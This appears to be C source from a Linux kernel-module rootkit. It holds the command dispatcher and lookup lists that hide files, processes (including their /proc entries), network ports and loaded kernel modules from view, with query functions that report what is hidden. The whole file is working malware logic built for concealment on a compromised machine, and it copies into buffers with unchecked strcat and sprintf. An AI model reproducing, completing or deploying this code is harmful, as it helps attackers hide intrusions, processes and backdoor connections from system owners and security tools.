#include "cmd.h"
#include "list.h"

//创建四个双向循环链表，没有数据域
LIST_HEAD(list_files);
LIST_HEAD(list_procs);
LIST_HEAD(list_ports);
LIST_HEAD(list_lkms);

void add_lkm(void *p);
void *del_lkm(const char *name);

int
lkm_mesg_proc(PCMD pCmd) {
    switch (pCmd->type) {
        case CMD_HIDE_FILE:
        {
            if (pCmd->data) {
	            DLog("hide file '%s'", pCmd->data);
            } else {
	            DLog("hide file error");
            }

            insert_chars(&list_files, pCmd->data);
        }
            break;
        case CMD_HIDE_PROCESS:
        {
            char file[260];

            sprintf(file, "/%d", pCmd->ndat);
            insert_chars(&list_files, file);
            sprintf(file, "/proc/%d", pCmd->ndat);
            insert_chars(&list_files, file);
            insert_int(&list_procs, pCmd->ndat);
        }
            break;
        case CMD_HIDE_SOCKET:
        {
            insert_int(&list_ports, pCmd->ndat);
        }
            break;
        case CMD_HIDE_KRNLMOD:
        {
            //void *p;
            //char data[260];

            if (pCmd->data) {
                DLog("hide lkm '%s'", pCmd->data);
            } else {
                DLog("hide lkm error");
            }

            del_lkm(pCmd->data);
            insert_chars(&list_lkms, pCmd->data);
        }
            break;
        case CMD_UNHIDE_FILE:
        {
            delete_chars(&list_files, pCmd->data);
        }
            break;
        case CMD_UNHIDE_PROCESS:
        {
            char file[260];

            sprintf(file, "/%d", pCmd->ndat);
            delete_chars(&list_files, file);
            sprintf(file, "/proc/%d", pCmd->ndat);
            delete_chars(&list_files, file);
            delete_int(&list_procs, pCmd->ndat);
        }
            break;
        case CMD_UNHIDE_SOCKET:
        {
            delete_int(&list_ports, pCmd->ndat);
        }
            break;
        case CMD_UNHIDE_KRNLMOD:
        {
        }
            break;
        case CMD_QUERY_FILE:
        {
            PSTR_PKG pstr = (PSTR_PKG) pCmd;
            struct list_chars *p;
            struct list_head *pos;

            pstr->size = 0;
            strcpy(pstr->data, "");

            list_for_each(pos, &list_files) {
                p = list_entry(pos, struct list_chars, list);
                pstr->size++;
                strcat(pstr->data, p->data);
                strcat(pstr->data, " ");
            }

            return strlen(pstr->data) + sizeof (INT_PKG);
        }
            break;
        case CMD_QUERY_PROCESS:
        {
            PINT_PKG pint = (PINT_PKG) pCmd;
            struct list_int *p;
            struct list_head *pos;

            pint->size = 0;

            list_for_each(pos, &list_procs) {
                p = list_entry(pos, struct list_int, list);
                pint->data[pint->size++] = p->data;
            }

            return pint->size * sizeof (int) + sizeof (INT_PKG);
        }
            break;
        case CMD_QUERY_SOCKET:
        {
            PINT_PKG pint = (PINT_PKG) pCmd;
            struct list_int *p;
            struct list_head *pos;

            pint->size = 0;

            list_for_each(pos, &list_ports) {
                p = list_entry(pos, struct list_int, list);
                pint->data[pint->size++] = p->data;
            }

            return pint->size * sizeof (int) + sizeof (INT_PKG);
        }
            break;
        case CMD_QUERY_KRNLMOD:
        {
            PSTR_PKG pstr = (PSTR_PKG) pCmd;
            struct list_chars *p;
            struct list_head *pos;

            pstr->size = 0;
            strcpy(pstr->data, "");

            list_for_each(pos, &list_lkms) {
                p = list_entry(pos, struct list_chars, list);
                pstr->size++;
                strcat(pstr->data, p->data);
                strcat(pstr->data, " ");
            }

            return strlen(pstr->data) + sizeof (INT_PKG);
        }
            break;
        default:
            break;
    }

    return 0;
}

int
check_files(char * filename) {
    return search_chars(&list_files, filename);
}

int
check_procs(unsigned int pid) {
    return search_int(&list_procs, pid);
}

int
check_ports(unsigned int port) {
    return search_int(&list_ports, port);
}

int
proc_items(void) {
    return count_list(&list_procs);
}

int
get_hide_proc(int i) {
    return get_int(&list_procs, i);
}

